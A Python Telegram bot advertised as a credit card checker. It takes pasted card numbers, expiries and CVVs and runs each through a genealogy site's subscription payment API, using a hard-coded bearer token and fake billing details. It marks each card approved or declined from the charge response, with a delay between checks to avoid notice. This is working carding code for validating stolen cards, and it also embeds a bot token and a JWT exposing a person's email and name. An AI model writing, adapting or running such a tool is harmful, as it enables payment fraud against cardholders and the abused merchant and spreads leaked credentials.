import re
import time
import threading
import requests
import telebot

BOT_TOKEN = '7621706011:AAE8N5F-uz1CNQ2T4QrXqKP7sTxuSeM-YgE'
bot = telebot.TeleBot(BOT_TOKEN)

user_stop_flag = {}
processing_status = {}

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

def is_declined(resp_text):
    if "CHARGEFAILED" in resp_text:
        return True
    if '"chargeStatus":"TRANSACTION-CHARGEFAILED"' in resp_text:
        return True
    if '"invalidCard":1' in resp_text:
        return True
    return False

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        "🔒 Credit Card Checker Bot\n\n"
        "Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "⏳ 15s delay between checks\n"
        "⏹ Use /stop to cancel processing",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹ Processing stopped")

def check_card_flow(message, cards):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_stop_flag[user_id] = False

    AUTHORIZATION_VALUE = (
        "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InFqUzVEVkJqY3VwWnQxdzY3aGpJTiJ9."
        "eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9saW5rZWRpZGVudGl0aWVzIjoxLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9pc0R1cGxpY2F0ZSI6ZmFsc2UsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAu"
        "b3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2dpdmVubmFtZSI6IlBlc2hhbmciLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zdXJuYW1lIjoiU2FsYW0iLCJlbWFpbCI6InBlc2hhbmdkZXZAZ21haWwuY29tIiwib2JqZWN0SWQiOiIwZmNjNDcwOC1lZTJlLTRkY2ItOWQ4Yi1hMWQ3OGUwMjU4N2YiLCJhcHBfbWV0YWRhdGFfVXNlcklkIjoiMGZjYzQ3MDgtZWUyZS00ZGNiLTlkOGItYTFkNzhlMDI1ODdmIiwiZXh0ZW5zaW9uX1BsYW5JZCI6bnVsbCwiZXh0ZW5zaW9uX1N0YXJ0RGF0ZSI6IiIsImV4dGVuc2lvbl9FbmREYXRlIjoiIiwiZXh0ZW5zaW9uX1N1YnNjcmlwdGlvblN0YXR1cyI6IiIsImV4dGVuc2lvbl9SZWN1cmx5U3Vic2NyaXB0aW9uVXVpZCI6IiIsImV4dGVuc2lvbl9Hcm91cEluZm8iOiJ7fSIsImV4dGVuc2lvbl9XZWJzaXRlSWQiOiI0NjcwIiwiZXh0ZW5zaW9uX1VzZXJUeXBlIjoiRnJlZSIsImV4dGVuc2lvbl9Jc0ZyZWVUcmlhbCI6ZmFsc2UsImxvZ2luX2NvdW50IjoxLCJCb29rUGxhbklkIjpudWxsLCJCb29rU3RhcnREYXRlIjoiIiwiQm9va0VuZERhdGUiOiIiLCJCb29rU3Vic2NyaXB0aW9uU3RhdHVzIjpudWxsLCJCb29rUmVjdXJseVN1YnNjcmlwdGlvblV1aWQiOm51bGwsIk5BVXNlcklkIjoiMCIsIlJlY3VybHlVc2VybmFtZSI6IiIsImlzcyI6Imh0dHBzOi8vYXV0aC5zdG9yaWVkLmNvbS8iLCJzdWIiOiJhdXRoMHw2ODIxNzQ1ODMwOWQ4YmJmNDI0NGE4MmEiLCJhdWQiOlsiaHR0cHM6Ly9wcm9kYXBpZW5kcG9pbnQuY29tIiwiaHR0cHM6Ly9uYS1zdG9yaWVkLXByb2QudXMuYXV0aDAuY29tL3VzZXJpbmZvIl0sImlhdCI6MTc0NzAyMjk1NSwiZXhwIjoxNzQ3MTA5MzU1LCJzY29wZSI6Im9wZW5pZCBwcm9maWxlIGVtYWlsIiwiYXpwIjoiZnYzRGFwRklZWDZoNWJCVXNVOFF3Wml4STliczlMTHMifQ.fTKyo1y5PaDu3Ui0WUpnkJbUVjJ0MXuHHOgBfm5o1RkleLwxdxiWeA2yZgXFFtpUH1mWnUkViqXWw3YfOJAajDEUNosZiMG_RL1LD-u721E-ihhxeZi9v6wMDB8Mu1Hd0xauUDq1vzBLjHIg99Npk4gQ4qBhezrfswAWB_XefXKp9KfMwnp1k-RLH-f3gkWkKBOvJeIoSYysAnRRXuUBSzojxQ9y50-7Ar6AwAN7TqQjGU4QAZdHG4rZ28-Y_5Eg32ihvdsQhctwF6011gDlTd-sclKUNKtfl8iEtioGGn6GzWXDC8iYDMorD5AuIArQSrWOoWTrgYZLVGcocDrHDQ"
    )

    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        payload = {
            "BillingInformation": {
                "Address": "198 White Horse Pike",
                "Phone": "3144740104",
                "State": "NJ",
                "Country": "US",
                "CityName": "Collingswood",
                "Zipcode": "10080"
            },
            "CreditCardInformation": {
                "CreditCardNumber": f"{cc} {mm} {yy} {cvv}",
                "Cvv2Number": f"{cvv} ",
                "ExpirationMonth": mm,
                "ExpirationYear": yy[-2:]
            },
            "UserInformation": {
                "Firstname": "John",
                "Lastname": "Doe",
                "EmailAddress": "peshangdev@gmail.com",
                "PlanId": "19690",
                "UserId": "",
                "Auth0Id": ""
            },
            "CouponCode": "",
            "CouponDiscount": "",
            "PlanId": "",
            "AffiliateCartId": "ec879e15-8ea5-4c73-8103-09af2fd7bd74",
            "RecurlyCustomFields": {}
        }

        headers = {
            "Content-Type": "application/json",
            "Authorization": AUTHORIZATION_VALUE,
            "Accept": "application/json, text/plain, */*",
            "wa-clientid": "550833b9-cc11-edd0-8e24-9f2ffa260df0",
            "wa-requestid": "8c29ee48-0bcd-47ce-aaaf-5120573ca220"
        }

        try:
            response = requests.post(
                "https://api.storied.com/api/User/subscribe",
                json=payload,
                headers=headers,
                timeout=30
            )
            text = response.text
            if "CHARGEFAILED" in text or '"chargeStatus":"TRANSACTION-CHARGEFAILED"' in text or '"invalidCard":1' in text:
                status = "❌ Declined"
            else:
                status = "✅ Approved"

            bot.send_message(
                chat_id,
                f"Card #{idx}\n"
                f"Number: {cc}|{mm}|{yy}|{cvv}\n"
                f"Status: {status}\n"
                f"Response:\n<code>{text}</code>",
                parse_mode="HTML"
            )

        except Exception as e:
            bot.send_message(chat_id, f"❌ Error processing card #{idx}: {str(e)}")

        if idx < len(cards):
            for i in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    user_id = message.from_user.id
    if processing_status.get(user_id):
        bot.send_message(message.chat.id, "⚠️ Already processing cards, please wait")
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Invalid format. Please send cards as:\n"
            "CC|MM|YY|CVV\nCC|MM|YYYY|CVV\n"
            "CC/MM/YY/CVV\nCC/MM/YYYY/CVV"
        )
        return

    processing_status[user_id] = True
    bot.send_message(message.chat.id, f"🔍 Processing {len(cards)} cards...")

    def process_wrapper():
        check_card_flow(message, cards)
        processing_status[user_id] = False

    threading.Thread(target=process_wrapper).start()

if __name__ == '__main__':
    processing_status = {}
    AUTHORIZATION_VALUE = (
        "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InFqUzVEVkJqY3VwWnQxdzY3aGpJTiJ9."
        "eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9saW5rZWRpZGVudGl0aWVzIjoxLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9pc0R1cGxpY2F0ZSI6ZmFsc2UsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAu"
        "b3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2dpdmVubmFtZSI6IlBlc2hhbmciLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zdXJuYW1lIjoiU2FsYW0iLCJlbWFpbCI6InBlc2hhbmdkZXZAZ21haWwuY29tIiwib2JqZWN0SWQiOiIwZmNjNDcwOC1lZTJlLTRkY2ItOWQ4Yi1hMWQ3OGUwMjU4N2YiLCJhcHBfbWV0YWRhdGFfVXNlcklkIjoiMGZjYzQ3MDgtZWUyZS00ZGNiLTlkOGItYTFkNzhlMDI1ODdmIiwiZXh0ZW5zaW9uX1BsYW5JZCI6bnVsbCwiZXh0ZW5zaW9uX1N0YXJ0RGF0ZSI6IiIsImV4dGVuc2lvbl9FbmREYXRlIjoiIiwiZXh0ZW5zaW9uX1N1YnNjcmlwdGlvblN0YXR1cyI6IiIsImV4dGVuc2lvbl9SZWN1cmx5U3Vic2NyaXB0aW9uVXVpZCI6IiIsImV4dGVuc2lvbl9Hcm91cEluZm8iOiJ7fSIsImV4dGVuc2lvbl9XZWJzaXRlSWQiOiI0NjcwIiwiZXh0ZW5zaW9uX1VzZXJUeXBlIjoiRnJlZSIsImV4dGVuc2lvbl9Jc0ZyZWVUcmlhbCI6ZmFsc2UsImxvZ2luX2NvdW50IjoxLCJCb29rUGxhbklkIjpudWxsLCJCb29rU3RhcnREYXRlIjoiIiwiQm9va0VuZERhdGUiOiIiLCJCb29rU3Vic2NyaXB0aW9uU3RhdHVzIjpudWxsLCJCb29rUmVjdXJseVN1YnNjcmlwdGlvblV1aWQiOm51bGwsIk5BVXNlcklkIjoiMCIsIlJlY3VybHlVc2VybmFtZSI6IiIsImlzcyI6Imh0dHBzOi8vYXV0aC5zdG9yaWVkLmNvbS8iLCJzdWIiOiJhdXRoMHw2ODIxNzQ1ODMwOWQ4YmJmNDI0NGE4MmEiLCJhdWQiOlsiaHR0cHM6Ly9wcm9kYXBpZW5kcG9pbnQuY29tIiwiaHR0cHM6Ly9uYS1zdG9yaWVkLXByb2QudXMuYXV0aDAuY29tL3VzZXJpbmZvIl0sImlhdCI6MTc0NzAyMjk1NSwiZXhwIjoxNzQ3MTA5MzU1LCJzY29wZSI6Im9wZW5pZCBwcm9maWxlIGVtYWlsIiwiYXpwIjoiZnYzRGFwRklZWDZoNWJCVXNVOFF3Wml4STliczlMTHMifQ.fTKyo1y5PaDu3Ui0WUpnkJbUVjJ0MXuHHOgBfm5o1RkleLwxdxiWeA2yZgXFFtpUH1mWnUkViqXWw3YfOJAajDEUNosZiMG_RL1LD-u721E-ihhxeZi9v6wMDB8Mu1Hd0xauUDq1vzBLjHIg99Npk4gQ4qBhezrfswAWB_XefXKp9KfMwnp1k-RLH-f3gkWkKBOvJeIoSYysAnRRXuUBSzojxQ9y50-7Ar6AwAN7TqQjGU4QAZdHG4rZ28-Y_5Eg32ihvdsQhctwF6011gDlTd-sclKUNKtfl8iEtioGGn6GzWXDC8iYDMorD5AuIArQSrWOoWTrgYZLVGcocDrHDQ"
    )

    bot.infinity_polling()
